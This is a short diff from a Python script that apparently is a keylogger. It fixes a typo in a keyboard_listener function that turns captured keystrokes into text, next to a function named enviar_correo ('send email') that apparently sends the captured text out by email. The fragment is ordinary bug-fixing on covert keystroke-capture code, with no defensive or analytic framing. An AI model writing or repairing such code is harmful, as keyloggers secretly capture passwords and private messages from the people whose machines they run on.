@@ -23,7 +23,7 @@ def enviar_correo():
     server.quit
     
 def keyboard_listener(key):
-    etter = str(key)
+    letter = str(key)
     letter = letter.replace("'","")
     if letter == "Key.space":
         letter = ' '
